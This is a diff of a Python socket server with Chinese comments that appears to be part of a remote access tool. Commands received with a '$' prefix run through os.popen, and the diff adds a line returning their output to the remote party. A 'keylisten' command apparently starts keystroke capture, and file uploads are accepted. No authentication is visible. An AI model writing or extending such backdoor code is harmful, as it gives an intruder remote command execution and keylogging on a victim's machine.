@@ -23,18 +23,16 @@ while 1:
         try:
             data = conn.recv(1024)  # 接收对方字符串 #如果对方不发数据会卡住
             print(data)
+            data = str(data, encoding="utf-8")
             if len(data)<=0 or data=="\n" or data=="\r" or data=="":
                 print("对方发送了空数据")
                 data2="你发送了空数据"
-                break
-            if data == b"q":
-                break
-            data = str(data, encoding="utf-8")
-            if (data[0]=="$"):
+            
+            elif (data[0]=="$"):
                 data=data.replace("$","")
                 f = os.popen(data)  # 可以将命令的内容以读取的方式返回
                 data2 = f.read()
-                
+                conn.send(bytes(data2, encoding="gbk"))
             elif(data[0]=="@"):
                 data=data.replace("@","")
                 if data=="keylisten": 
@@ -58,6 +56,7 @@ while 1:
                                 recvd_size = file_size
                             fp.write(data)
                         fp.close()
+                        print("sucess")
                         conn.send(bytes("success", encoding="gbk"))
 
             else:
